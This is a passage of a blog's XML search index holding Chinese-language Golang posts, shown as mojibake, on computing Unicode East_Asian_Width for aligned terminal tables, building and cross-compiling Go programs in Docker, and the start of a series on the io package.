      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>unicode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golangè·å–å­—ç¬¦çš„å®½åº¦(East_Asian_Width)]]></title>
    <url>%2F2017%2F05%2F10%2Fgolang-char-width%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘åœ¨ç”¨golangå†™CLI, æ•°æ®åœ¨ç»ˆç«¯ä»¥Tableæ–¹å¼å±•ç¤ºå’ŒMySLQè¾“å‡ºçš„è¡¨æ ¼ä¸€æ ·, ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªGitHubä¸Šä¸æ€ä¹ˆå‡ºåçš„é¡¹ç›®, å› ä¸ºè¯¥é¡¹ç›®é€»è¾‘æ¸…æ™°, åŠŸèƒ½ä¹Ÿå®Œå–„, è‡ªå·±ä¹Ÿèƒ½å¾ˆå¥½çš„çœ‹æ‡‚, å®¹æ˜“ç»´æŠ¤, ä½†æ˜¯å‰äº›å¤©å‡ºäº†ä¸€ä¸ªé—®é¢˜: å½•å…¥ä¸­æ–‡å­—ç¬¦å’Œä¸€äº›ç‰¹æ®Šå­—ç¬¦è¿‡ä¼šè®©Tableæ— æ³•å¯¹é½, æˆ‘å·²ç»forkè¿‡æ¥ä¿®å¤äº†, ä½†æ˜¯å…¶ä¸­æ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹, æƒ³é€šè¿‡è¿™ç¯‡åšå®¢æ¥è®²æ¸…æ¥šã€‚ é—®é¢˜æˆ‘ä½¿ç”¨ä¸€ä¸ªå«simpletalbeçš„åº“: GitHubåœ°å€, æˆ‘ä½¿ç”¨ä»–çš„ä¾‹å­, æ·»åŠ äº†ä¸€è¡Œä¸­æ–‡è¾“å…¥ï¼Œç»“æœæ˜¯è¿™æ ·çš„:123456789101112131415161718Default style+----+------------------+--------------+-----------------------------+------+| # | NAME | PHONE | EMAIL | QTTY |+----+------------------+--------------+-----------------------------+------+| 1 | Newton G. Goetz | 252-585-5166 | NewtonGGoetz@dayrep.com | 10 || 2 | Rebecca R. Edney | 865-475-4171 | RebeccaREdney@armyspy.com | 12 || 3 | John R. Jackson | 810-325-1417 | JohnRJackson@armyspy.com | 15 || 4 | Ron J. Gomes | 217-450-8568 | RonJGomes@rhyta.com | 25 || 5 | Penny R. Lewis | 870-794-1666 | PennyRLewis@rhyta.com | 5 || 6 | Sofia J. Smith | 770-333-7379 | SofiaJSmith@armyspy.com | 3 || 7 | Karlene D. Owen | 231-242-4157 | KarleneDOwen@jourrapide.com | 12 || 8 | Daniel L. Love | 978-210-4178 | DanielLLove@rhyta.com | 44 || 9 | Julie T. Dial | 719-966-5354 | JulieTDial@jourrapide.com | 8 || 10 | Juan J. Kennedy | 908-910-8893 | JuanJKennedy@dayrep.com | 16 || 11 | ä¸­æ–‡å¤¹æ¸£ abc | ç‰¹æ®Šå­—ç¬¦å¤¹æ¸£ â„ƒ | JuanJKennedy@dayrep.com | 16 |+----+------------------+--------------+-----------------------------+------+| Subtotal | 166 |+----+------------------+--------------+-----------------------------+------+ ä»”ç»†è§‚å¯Ÿå¯ä»¥å‘ç°é—®é¢˜, ä¸€ä¸ªä¸­æ–‡çš„å®½åº¦æ˜¯2ä¸ªè‹±æ–‡å­—ç¬¦çš„å®½åº¦,ä½†æ˜¯ä»–å´ä¾ç„¶ä½¿ç”¨1ä¸ªå®½åº¦æ¥è®¡ç®—, è‡´ä½¿å®é™…å­—ç¬¦çš„å®½åº¦å°‘ç®—äº†4ä½, æ‰€ä»¥ç¬¬ä¸€ä¸ªNameè¡¨æ ¼å­—ç¬¦å¤šå‡ºå»äº†4ä¸ªå­—ç¬¦å®½åº¦ã€‚ è¿™ä¸ªé—®é¢˜çš„æœ¬è´¨æ˜¯ä¸€ä¸ªç¼–ç é—®é¢˜, ç”±äºGolangå†…éƒ¨å­—ç¬¦ç»Ÿä¸€ä½¿ç”¨Unicodeç¼–ç , æ‰€ä»¥é—®é¢˜å®šä½ä¸º unicode ç¼–ç çš„å­—ç¬¦å®½åº¦é—®é¢˜, è¯¥é—®é¢˜å’Œè¯­è¨€æ— å…³, åªè¦ä½ ä½¿ç”¨unicode å°±ä¼šæœ‰è¿™ä¸ªé—®é¢˜, é¡ºç€è¿™ä¸ªé—®é¢˜ æˆ‘ä»¬æ¥è¯´æ˜Golangçš„ä¸­çš„å­—ç¬¦ç±»å‹Rune Golangä¸­çš„Runeç±»å‹åœ¨pythonä¸­ä¸€ä¸ªå­—ç¬¦ä»¥charç±»å‹è¡¨ç¤º, è€Œåœ¨Golangä¸­å­—ç¬¦ç±»å‹ä»¥Runeè¡¨ç¤º, æ³¨æ„å­—ç¬¦é€šè¿‡ç è¡¨(code point)æ¥è¿›è¡Œç¿»è¯‘, æ‰€ä»¥å­—ç¬¦ä¸²æ˜¯ç è¡¨ç¿»è¯‘è¿‡æ¥æ‹¼æ¥è€Œæˆçš„, æ‰€ä»¥ä¸è¦å‚»å‚»æä¸æ¸…æ¥šruneå’Œstringçš„åŒºåˆ«ã€‚ golangé‡Œé¢ç”¨ â€œâ€ è¡¨ç¤ºå­—ç¬¦ä¸², ç”¨æˆ·``è¡¨ç¤ºå¤šè¡Œå­—ç¬¦ä¸², â€˜â€™è¡¨ç¤ºå­—ç¬¦, æ¯”å¦‚:1234a := "å­—ç¬¦ä¸²"b := `å¤šè¡Œå­—ç¬¦ä¸²`c := 'ä¸­' è¯¥ç½‘ç«™æœ‰unicodeçš„ç ä½è¡¨: unicode-utf8-table, æˆ‘ä»¬ä»ä¸­æ‰¾å‡ºä¸€éƒ¨åˆ†æ¥åšæµ‹è¯•: æˆ‘ä»¬ä»¥æ‰“å°ä¸‹4e07ä¸ºä¾‹æ¥ éªŒè¯ä¸‹code point:1234func main() &#123; fmt.Printf("%c\n", 0x4e07) fmt.Printf("%x\n", 'ä¸‡')&#125; å…³äºå­—ç¬¦å®½åº¦ç¼–ç ä¹‹æˆ˜å§‹äºAsciiç ç©ºä½™çš„ç¬¬8ä½, æœ€ç»ˆä»¥unicodeç»Ÿä¸€ è¿™æ˜¯ä¸€åœºæƒŠå¿ƒåŠ¨é­„çš„å†å², æˆ‘åœ¨ä¹‹å‰ç¯‡è¿ç»´çš„åšå®¢ä¸­æœ‰è¿‡ä»‹ç», å½“æ—¶èŠ±äº†1ä¸ªæ˜ŸæœŸæ’¸ç¼–ç é—®é¢˜, åé¢ä¼šå°†å…¶è½¬è¿‡æ¥(ä¹°çš„VPSå¿«åˆ°æœŸäº†)ã€‚ å…³äºç¼–ç ä»‹ç»: ç¼–ç ä¹‹æˆ˜ æœ‰äº†ä¸Šé¢çš„åŸºç¡€, æˆ‘ä»¬ç»§ç»­å­—ç¬¦å®½åº¦çš„é—®é¢˜, æ–‡ç« æ ‡é¢˜å«æœ‰:East_Asian_Width, è¿™ä¸ªä¸œè¥¿å¾ˆé‡è¦, å®ƒåœ¨unicodeæ ‡å‡†ä¸­è´Ÿè´£å®šä¹‰å­—ç¬¦çš„å®½åº¦ã€‚è®©æˆ‘ä»¬ç”±æµ…å…¥æ·±çš„å¼€å§‹ä»‹ç»ã€‚ æˆªæ­¢æˆ‘å†™è¿™ç¯‡åšå®¢ä¹‹æ—¶, unicodeè§„èŒƒçš„ç¨³å®šç‰ˆæ˜¯ç¬¬9ç‰ˆï¼Œå¼€å‘ç‰ˆæ˜¯ç¬¬10ç‰ˆ, æˆ‘ä¸»è¦å‚è€ƒunicode9è§„èŒƒçš„æ–‡æ¡£ã€‚ åœ¨unicode9ä¸­çš„æŠ€æœ¯æŠ¥å‘Šä¸­æœ‰å…³äº unicodeæ ‡å‡†çš„æ‰€æœ‰çš„è§„èŒƒ: Unicode Technical Reports , å…¶ä¸­ Unicode Standard Annexes æè¿°äº†unicodeæ‰€æœ‰ç›¸å…³è§„èŒƒï¼Œå…¶ä¸­è¿™2ä¸ªè§„èŒƒéœ€è¦æˆ‘ä»¬å…³æ³¨: UNICODE CHARACTER DATABASE: ç”¨äºæè¿°ç è¡¨(code point), æ—¢Unicodeå­—ç¬¦æ•°æ®åº“(UCD),å®ƒæè¿°äº†Unicodeå­—ç¬¦æ•°æ®åº“çš„å¸ƒå±€å’Œç»„ç»‡ï¼Œä»¥åŠå®ƒå¦‚ä½•æŒ‡å®šUnicodeå­—ç¬¦å±æ€§çš„å½¢å¼åŒ–å®šä¹‰. EAST ASIAN WIDTH: ç”¨äºæè¿°ä¸œäºšä¼ ç»Ÿå­—ç¬¦é›†çš„ä¿¡æ¯å±æ€§çš„è§„èŒƒ, å…¶ä¸­å°±åŒ…æ‹¬å­—ç¬¦å®½åº¦.åœ¨UCDè§„èŒƒä¸­, unicodeå­—ç¬¦æœ‰ä¸€ä¸ªEast_Asian_Widthå±æ€§(5.11.1æè¿°äº†äºŒè¿›åˆ¶å±æ€§),å®šä¹‰äº†ä¸€ä¸ªunicodeå­—ç¬¦å¯èƒ½å‡ºç°çš„å­—ç¬¦å®½åº¦ã€‚12345678# East_Asian_Width (ea)ea ; A ; Ambiguousea ; F ; Fullwidthea ; H ; Halfwidthea ; N ; Neutralea ; Na ; Narrowea ; W ; Wide å…¶ä¸­é™¤Aä¸ç¡®å®šå¤–ï¼ŒF/H/N/Na/Wéƒ½èƒ½å¾ˆæ˜ç¡®çš„çŸ¥é“å®½åº¦ã€‚å› æ­¤æ¯ä¸€ä¸ªunicodeå­—ç¬¦æˆ‘ä»¬åªéœ€è¦çŸ¥é“å…¶East_Asian_Widthå±æ€§çš„å€¼ å°±å¯çŸ¥é“å…¶å­—ç¬¦çš„å®½åº¦, ä½†æ˜¯æŸ¥çœ‹äº†ä¸‹Golang unicodeæ ‡å‡†åº“, å¹¶æ²¡æœ‰å‘ç°East_Asian_Widthç›¸å…³å±æ€§çš„å®ç°å’Œæ–¹æ³•, å› æ­¤ä¼°è®¡éœ€è¦è‡ªå·±å®ç°äº†ã€‚ å¦‚ä½•å®ç°East_Asian_Widthå–ƒ?, è¿™å°±éœ€è¦åˆšæ‰æåˆ°çš„unicodeè§„èŒƒä¸­çš„å¦å¤–ä¸€ä¸ªè§„èŒƒEAST ASIAN WIDTH, è¯¥æ–‡æ¡£æ•´ç†å‡ºäº†æ‰€æœ‰çš„unicodeå­—ç¬¦çš„å®½åº¦çš„èŒƒå›´è¡¨, è¯¥è§„èŒƒçš„ 6.3èŠ‚ä¸­ ç»™å‡ºäº†è¿™ä¸ªèŒƒå›´è¡¨unicodeå­—ç¬¦å®½åº¦èŒƒå›´è¡¨,åªè¦æœ‰è¿™å¼ è¡¨æˆ‘ä»¬å°±å¯ä»¥çŸ¥é“å­—ç¬¦å®½åº¦ã€‚ å› æ­¤æˆ‘ä»¬æ ¹æ®è¿™å¼ èŒƒå›´è¡¨å¯ä»¥å®ç°ä¸€ä¸ªè·å–unicodeå­—ç¬¦å®½åº¦çš„åŠŸèƒ½æ¨¡å—, é»˜è®¤F/Wä¸ºFullwidth, å…¶ä»–ä¸ºHalfwidth, è¯¥æ¨¡å—å…·ä½“ä»£ç è§: east_asian_width, æœ‰äº†è¿™ä¸ªæ¨¡å—æˆ‘ä»¬å°±å¯ä»¥æ¥è§£å†³ å­—ç¬¦å®½åº¦é—®é¢˜äº† è§£å†³å­—ç¬¦å®½åº¦é—®é¢˜æˆ‘ä»¬æ‰¾åˆ°simpletalbeé‡Œé¢å…³äºå­—ç¬¦é•¿åº¦çš„ä»£ç :123456789101112131415// width returns content widthfunc (c *content) width() int &#123; m := c.maxLinewidth() if m &gt; c.w &#123; return m &#125; return c.w&#125;// line formats content linefunc (c *content) line(l string, a int) string &#123; len := c.width() - utf8.RuneCountInString(l) ...&#125; æˆ‘ä»¬å®šä¹‰å¥½è·å–å­—ç¬¦é•¿åº¦çš„å‡½æ•°ï¼Œæä¾›æ‰ä»–çš„åˆ¤æ–­æ–¹æ³•123456789101112131415161718192021222324252627282930313233343536// get the string widthfunc getStringWidth(str string) int &#123; w := 0 for _, c := range []rune(str) &#123; if IsHalfwidth(c) &#123; w = w + 1 &#125; else &#123; w = w + 2 &#125; &#125; return w&#125;// width returns maximum content lines widthfunc (c *content) maxLinewidth() int &#123; w := 0 for _, r := range c.c &#123; l := getStringWidth(r) if l &gt; w &#123; w = l &#125; &#125; return w&#125;// line formats content linefunc (c *content) line(l string, a int) string &#123; len := c.width() - getStringWidth(l) ...&#125; ç„¶åæµ‹è¯•æ•ˆæœ123456789101112131415161718Default style+----+------------------+----------------+-----------------------------+------+| # | NAME | PHONE | EMAIL | QTTY |+----+------------------+----------------+-----------------------------+------+| 1 | Newton G. Goetz | 252-585-5166 | NewtonGGoetz@dayrep.com | 10 || 2 | Rebecca R. Edney | 865-475-4171 | RebeccaREdney@armyspy.com | 12 || 3 | John R. Jackson | 810-325-1417 | JohnRJackson@armyspy.com | 15 || 4 | Ron J. Gomes | 217-450-8568 | RonJGomes@rhyta.com | 25 || 5 | Penny R. Lewis | 870-794-1666 | PennyRLewis@rhyta.com | 5 || 6 | Sofia J. Smith | 770-333-7379 | SofiaJSmith@armyspy.com | 3 || 7 | Karlene D. Owen | 231-242-4157 | KarleneDOwen@jourrapide.com | 12 || 8 | Daniel L. Love | 978-210-4178 | DanielLLove@rhyta.com | 44 || 9 | Julie T. Dial | 719-966-5354 | JulieTDial@jourrapide.com | 8 || 10 | Juan J. Kennedy | 908-910-8893 | JuanJKennedy@dayrep.com | 16 || 11 | adfsbâ€œ | ç‰¹æ®Šå­—ç¬¦å¤¹æ¸£ â„ƒ | JuanJKennedy@dayrep.com | 16 |+----+------------------+----------------+-----------------------------+------+| Subtotal | 166 |+----+------------------+----------------+-----------------------------+------+]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>unicode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¦‚ä½•ä½¿ç”¨å®¹å™¨buildå¤šå¹³å°golangç¨‹åº]]></title>
    <url>%2F2017%2F05%2F08%2Fbuild-goapp-with-docker%2F</url>
    <content type="text"><![CDATA[åœ¨CIå’ŒCDç¯å¢ƒä¸­, goalngæºç ç¨‹åºå¾€å¾€éœ€è¦buildä¸åŒå¹³å°çš„äºŒè¿›åˆ¶ç¨‹åº, è¿™æ—¶å€™ä½¿ç”¨å®¹å™¨æ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©, å› ä¸ºbuildå®Œæˆå,æˆ‘ä»¬å¯ä»¥ç«‹å³é‡Šæ”¾å®¹å™¨, è€Œä¸”ä¹Ÿä¿è¯äº†buildç¯å¢ƒçš„å¹²å‡€ã€‚ åŸºäºå®¹å™¨çš„buildä½¿ç”¨å®¹å™¨æ¥è¿›è¡Œbuild, æ‰€é‡åˆ°çš„ä¸€äº›å°å‘ã€‚ é—®é¢˜æˆ‘ä»¬é‡‡ç”¨vendoræ¥åšgolangé¡¹ç›®çš„ä¾èµ–ç®¡ç†, buildçš„dockeré•œåƒæ‹‰å–çš„å®˜æ–¹çš„golangå®˜æ–¹é•œåƒ, æŒ‰ç…§é•œåƒçš„ä½¿ç”¨è¯´æ˜:1$ docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp golang:1.6 go build -v ä½†æ˜¯å´æ²¡æœ‰æˆåŠŸ, æˆ‘é¡¹ç›®ä¸‹é¢çš„vendorçš„ä¾èµ–å¹¶æ²¡æœ‰è¢«goæ‰¾åˆ°ã€‚ è§£å†³åŠæ³•åœ¨å„ç§googleä¹‹åä¹Ÿæ²¡æ‰¾åˆ°åŸå› ã€‚ä»”ç»†è§‚å¯Ÿå®˜æ–¹çš„ç¤ºä¾‹æ‰å‘ç°ï¼Œä½¿ç”¨vendoråŠŸèƒ½æ—¶åŒ…éƒ½åœ¨$GOPATH/srcä¸‹ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ï¼Œæœç„¶æ˜¯è¿™æ ·ã€‚åªæœ‰åœ¨$GOPATH/srcä¸‹çš„åŒ…ï¼Œæ‰èƒ½ä½¿ç”¨vendorç›®å½•å­˜æ”¾ä¾èµ–åŒ…ã€‚ ç°åœ¨goå¯¹ä¸åœ¨$GOPATH/srcä¸‹å¼€å‘çš„é¡¹ç›®é™åˆ¶è¶Šæ¥è¶Šå¤šï¼Œæ‰€ä»¥è§£å†³åŠæ³•å°±å¾ˆæ˜æ˜¾äº†, å°†é¡¹ç›®æŒ‚åˆ°GOPATHçš„srcä¸‹é¢, æŸ¥ä¸‹é•œåƒçš„åå‘ç°GOPATHå°±æ˜¯/goï¼Œæ‰€ä»¥è§£å†³åŠæ³•æ˜¯è¿™æ ·1$ docker run --rm -v "$PWD":/go/src/myapp -w /go/src/myapp golang:1.6 go build -v æ³¨æ„ å°†myappæ›¿æ¢æˆä½ é¡¹ç›®çœŸæ­£çš„åç§°ã€‚ å¤šå¹³å°æ‰“åŒ…é€šè¿‡åœ¨dockerä¸­è¿›è¡Œäº¤å‰ç¼–è¯‘ï¼Œäº§å‡ºå„ç§å¹³å°çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ æœ¬åœ°ç¼–è¯‘ç®€å•æ¥è®²ï¼Œæœ¬åœ°ç¼–è¯‘å°±æ˜¯ä»¥ æœ¬åœ°ç¯å¢ƒä½œä¸ºè½¯ä»¶è¿è¡Œçš„ç›®æ ‡ç¯å¢ƒæ¥è¿›è¡Œ ç¨‹åºçš„ç¼–è¯‘, å› æ­¤å¦‚æœä½ æœ¬åœ°ç¯å¢ƒæ˜¯Macï¼Œé‚£ä¹ˆå°±åªèƒ½ç¼–è¯‘darwinå¹³å°çš„ï¼Œå¦‚æœä½ æœ¬åœ°æ˜¯Linuxå°±åªèƒ½ç¼–è¯‘å‡ºLinuxå¹³å°çš„ã€‚å¦‚æœä½ éœ€è¦å‘å¸ƒå¤šç§å¹³å°çš„è½¯ä»¶ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦å‡†å¤‡å¤šç§ç¯å¢ƒ, æ¥è¿›è¡Œåˆ†åˆ«build, è¿™æ˜¯æå…¶ä¸ä¾¿çš„ã€‚ è€Œä¸”å¯¹äºä¸€äº›åµŒå…¥å¼è®¾å¤‡è€Œè¨€ï¼Œå…¶æ€§èƒ½æœ‰é™, æ¯”å¦‚ä½é…çš„ARMå¹³å°, å¾ˆå¤šæƒ…å†µä¸‹æ— æ³•èƒœä»»æœ¬åœ°ç¼–è¯‘ã€‚ ä½†æ˜¯æœ¬åœ°ç¼–è¯‘ä¹Ÿæœ‰ä»–çš„ä¼˜ç‚¹: æœ¬åœ°ç¯å¢ƒçš„åŸç”Ÿæ€§ï¼Œæœ‰åŠ©äºä¿éšœç¨‹åºç¼–è¯‘åçš„ç¨³å®šæ€§å’Œå¯é æ€§, å› æ­¤æœ¬åœ°ç¼–è¯‘æ˜¯æœ€å¯é çš„ä¸€ç§æ‰‹æ®µã€‚ äº¤å‰ç¼–è¯‘ç®€å•åœ°è¯´ï¼Œå°±æ˜¯åœ¨ä¸€ä¸ªå¹³å°ä¸Šç”Ÿæˆå¦ä¸€ä¸ªå¹³å°ä¸Šçš„å¯æ‰§è¡Œç¨‹åº, æ‰€ä»¥å¸¦æ¥äº†å¾ˆå¤§çš„æ–¹ä¾¿æ€§, ä¸ç”¨å‡†å¤‡é‚£ä¹ˆå¤šå¹³å°çš„ç¯å¢ƒäº†ã€‚ è¦è¿›è¡Œäº¤å‰ç¼–è¯‘, é‚£ä¹ˆå¿…é¡»å‡†å¤‡å¥½äº¤å‰ç¼–è¯‘çš„ç¯å¢ƒ, äº¤å‰ç¼–è¯‘ç¯å¢ƒä¸€èˆ¬ç”± äº¤å‰ç¼–è¯‘å™¨å’Œå·¥å…·åŒ…ç»„æˆ, å¦‚æœä½ ä½¿ç”¨c/c++é‚£ä¹ˆä½ éœ€è¦ ä¸‹è½½é›†æˆå¥½çš„äº¤å‰ç¼–è¯‘ç¯å¢ƒï¼Œä¹Ÿå¯ä»¥è‡ªå·±åˆ¶ä½œ ï¼ˆæ¯”è¾ƒå¤æ‚ï¼Œå»ºè®®è¯»è€…ä¸‹è½½é›†æˆå¥½çš„äº¤å‰ç¼–è¯‘ç¯å¢ƒï¼‰, ä½†æ˜¯è¿™äº›Golangæ—©å·²ç»çœ‹ç©¿äº†, åœ¨Golangçš„å·¥å…·é“¾ä¸Šå·²ç»é›†æˆå¥½äº†, å› æ­¤ç›´æ¥ä½¿ç”¨å³å¯ã€‚ æ¥ä¸‹æ¥ä»‹ç»Golangä¸­çš„äº¤å‰ç¼–è¯‘ã€‚ Golangä¸­çš„äº¤å‰ç¼–è¯‘Golangçš„äº¤å‰ç¼–è¯‘ä¾èµ–2ä¸ªç¯å¢ƒå˜é‡çš„æ§åˆ¶: $GOARCH ç›®æ ‡å¹³å°ï¼ˆç¼–è¯‘åçš„ç›®æ ‡å¹³å°ï¼‰çš„å¤„ç†å™¨æ¶æ„ï¼ˆ386ã€amd64ã€armï¼‰ $GOOS ç›®æ ‡å¹³å°ï¼ˆç¼–è¯‘åçš„ç›®æ ‡å¹³å°ï¼‰çš„æ“ä½œç³»ç»Ÿï¼ˆdarwinã€freebsdã€linuxã€windowsï¼‰ äº¤å‰ç¼–è¯‘çš„ç³»ç»Ÿè¦æ±‚: OS ARCH OS version linux 386/amd64/arm &gt;= Linux 2.6 darwin 386/amd64 OS X (Snow Leapard + Lion) freebsd 386/amd64 &gt;= FreeBSD 7 windows 386/amd64 &gt;= Windows 2000 è¿›è¡Œäº¤å‰ç¼–è¯‘(å°½é‡å‡å°‘ä¾èµ–,æ–¹ä¾¿ç›´æ¥æ”¾å…¥dockerè¿è¡Œ, æ‰€ä»¥ç¼–è¯‘æ—¶ç¦ç”¨çš„CGO):123456789# å¦‚æœä½ æƒ³åœ¨Windows 32ä½ç³»ç»Ÿä¸‹è¿è¡Œ$ CGO_ENABLED=0 GOOS=windows GOARCH=386 go build# å¦‚æœä½ æƒ³åœ¨Windows 64ä½ç³»ç»Ÿä¸‹è¿è¡Œ$ CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build# å¦‚æœä½ æƒ³åœ¨Linux 32ä½ç³»ç»Ÿä¸‹è¿è¡Œ$ CGO_ENABLED=0 GOOS=linux GOARCH=386 go build# å¦‚æœä½ æƒ³åœ¨Linux 64ä½ç³»ç»Ÿä¸‹è¿è¡Œ$ CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang IOç³»åˆ—(ä¸€) - åŸºæœ¬çš„IOæ¥å£]]></title>
    <url>%2F2017%2F05%2F06%2Fgolang-io%2F</url>
    <content type="text"><![CDATA[åœ¨Golangå¼€å‘è¿‡ç¨‹ä¸­é›¶é›¶æ•£æ•£ä¼šé‡åˆ°å„ç§IOæ“ä½œ, æ¯æ¬¡ç™¾åº¦Googleä¹Ÿèƒ½è§£å†³, å¤§æ¦‚ç”¨æ³•ä¹Ÿè¿˜æ˜¯æ¸…æ¥š, ä½†æ˜¯ç¼ºå°‘ç³»ç»Ÿæ€§çš„å…¨é¢äº†è§£, ä¹Ÿæä¸æ¸…æ¥š, ä½¿ç”¨å“ªä¸ªæ–¹å¼æ‰æ˜¯æœ€ä¼˜çš„, å› æ­¤æ‰“ç®—å…¨é¢è¯»ä¸€éæ ‡å‡†åº“ä¸­ä¸ioç›¸å…³çš„æºç , æ€»ç»“æˆä¸€ç³»åˆ—çš„åšå®¢ã€‚ è¿™ä¸€ç³»åˆ—è¿™æ˜¯è¿™ä¸€ç³»åˆ—çš„ä¸€ä¸ªå¼€ç¯‡, ä¸»è¦è®²æ ‡å‡†åº“ä¸­çš„ä¸€äº›ioç›¸å…³, æ•´ä¸ªç³»åˆ—æ‰“ç®—å†™7ç¯‡: åŸºç¡€ç¯‡ åŸºæœ¬çš„IOæ¥å£(io) é«˜çº§çš„IOæ¥å£(ioutil) IOçš„æ ¼å¼åŒ–(fmt) IOçš„ç¼“å†²(bufio) è¿ç”¨ç¯‡ å­—ç¬¦ä¸²æ“ä½œ(strings.Reader) å­—èŠ‚æ“ä½œ(bytes.buffer) æ–‡ä»¶æ“ä½œ(os.File) IOçš„æ¦‚å¿µIOåœ¨è®¡ç®—æœºä¸­æŒ‡Input/Outputï¼Œä¹Ÿå°±æ˜¯è¾“å…¥å’Œè¾“å‡ºã€‚ç”±äºç¨‹åºå’Œè¿è¡Œæ—¶æ•°æ®æ˜¯åœ¨å†…å­˜ä¸­é©»ç•™ï¼Œç”±CPUè¿™ä¸ªè¶…å¿«çš„è®¡ç®—æ ¸å¿ƒæ¥æ‰§è¡Œï¼Œæ¶‰åŠåˆ°æ•°æ®äº¤æ¢çš„åœ°æ–¹ï¼Œé€šå¸¸æ˜¯ç£ç›˜ã€ç½‘ç»œç­‰ï¼Œå°±éœ€è¦IOæ¥å£ã€‚å„ç§è¯­è¨€ä¸€èˆ¬éƒ½ä¼šæä¾›IOåº“ä¾›å¼€å‘è€…ä½¿ç”¨ã€‚Goè¯­è¨€ä¹Ÿä¸ä¾‹å¤–ã€‚InputæŒ‡å¾€å†…å­˜ä¸­è¯»å–æ•°æ®, æ¯”å¦‚è¯»å–æ–‡ä»¶, è¯»å–æœåŠ¡å™¨å“åº”çš„ç½‘ç»œæ•°æ®, åœ¨Golangçš„IOæ¥å£ä¸­ä¸»è¦ä»¥Readeræ¥å®Œæˆã€‚OutoutæŒ‡ä»å†…å­˜ä¸­å¾€å¤–å‘é€æ•°æ®, æ¯”å¦‚å°†æ•°æ®ä¿å­˜å›ç£ç›˜çš„æ–‡ä»¶, ä½œä¸ºæœåŠ¡ç«¯æ—¶ï¼Œè¿”å›å®¢æˆ·éœ€è¦çš„æ•°æ®, åœ¨Golangçš„IOæ¥å£ä¸­ä¸»è¦ä»¥Writeræ¥å®Œæˆã€‚åœ¨IOç¼–ç¨‹ä¸­ï¼Œè¿˜æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„æ¦‚å¿µ:Stream(æµ), å¯ä»¥æŠŠæµæƒ³è±¡æˆä¸€ä¸ªæ°´ç®¡ï¼Œæ•°æ®å°±æ˜¯æ°´ç®¡é‡Œçš„æ°´ï¼Œä½†æ˜¯åªèƒ½å•å‘æµåŠ¨ã€‚Input Streamå°±æ˜¯æ•°æ®ä»å¤–é¢ï¼ˆç£ç›˜ã€ç½‘ç»œï¼‰æµè¿›å†…å­˜ï¼ŒOutput Streamå°±æ˜¯æ•°æ®ä»å†…å­˜æµåˆ°å¤–é¢å»ã€‚è€Œåƒæ°´ç®¡è¿™æ ·çš„ä¸œè¥¿ï¼Œåœ¨ä¸åŒè¯­è¨€é‡ŒåŸºæœ¬éƒ½æœ‰ä¸€ä¸ªä¸€æ ·çš„åç§°:pipe, Golangä¸­å…³äºpipeçš„ä¸€äº›åŠŸèƒ½å‡½æ•°éƒ½å®šä¹‰åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œé¢ã€‚ IOåŒ…çš„æ–‡ä»¶ä¸è¦æœ‰ææƒ§å¿ƒç†, IOæ ‡å‡†åº“çš„ä»£ç é‡å…¶å®å¹¶ä¸å¤š, é™¤å»testå’Œexample, å‰©ä¸‹çš„æ¨¡å—å…¶å®å°±5ä¸ª(io.go, multi.go, pipe.go, ioutil.go, tempfile.go), æ€»å…±ä¹Ÿæ‰åƒä½™è¡Œä»£ç ï¼Œè€Œä¸”è¿˜æœ‰å°†è¿‘ä¸€åŠæ˜¯æ³¨é‡Šã€‚1234567891011121314151617âœ io tree ..â”œâ”€â”€ example_test.goâ”œâ”€â”€ io.goâ”œâ”€â”€ io_test.goâ”œâ”€â”€ ioutilâ”‚ â”œâ”€â”€ example_test.goFâ”‚ â”œâ”€â”€ ioutil.goâ”‚ â”œâ”€â”€ ioutil_test.goâ”‚ â”œâ”€â”€ tempfile.goâ”‚ â””â”€â”€ tempfile_test.goâ”œâ”€â”€ multi.goâ”œâ”€â”€ multi_test.goâ”œâ”€â”€ pipe.goâ””â”€â”€ pipe_test.go1 directory, 12 files è¿™ç¯‡åšå®¢ä¸»è¦å…³æ³¨io.goï¼Œmulti.go, pipe.go 3ä¸ªæ–‡ä»¶ã€‚ ä»IOåŒ…çš„æ³¨è§£å¼€å§‹è®²èµ·ioåŒ…ä¸ºI/OåŸè¯­æä¾›äº†åŸºæœ¬çš„æ¥å£ã€‚å®ƒä¸»è¦åŠŸèƒ½æ˜¯åŒ…è£…äº†è¿™äº›åŸè¯­çš„å·²æœ‰å®ç°, è¿™ä¸ªæè¿°å¾—æœ‰ç‚¹ç»•, ç›´ç™½æ¥è¯´: IOè¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªè¿‡ç¨‹(è¾“å…¥ä¸è¾“å‡º), IOåŒ…å°±æ˜¯å°†è¾“å…¥ä¸è¾“å‡ºçš„è§„èŒƒå®šä¹‰æ¸…æ¥š(ä¸€äº›é€šç”¨çš„æ¥å£å’Œå‡½æ•°), è€Œå…·ä½“çš„è¾“å…¥ä»€ä¹ˆ,è¾“å‡ºä»€ä¹ˆ, æ˜¯ç”±å…·ä½“çš„å¯¹è±¡æ¥å®ç°,æ¯”å¦‚åé¢åº”ç”¨æ—¶éœ€è¦è®²åˆ°çš„strings, bytes, fileç­‰ã€‚ç”±äºè¿™äº›æ¥å£å’ŒåŸè¯­ä»¥ä¸åŒçš„å®ç°åŒ…è£…äº†ä½çº§æ“ä½œï¼Œå› 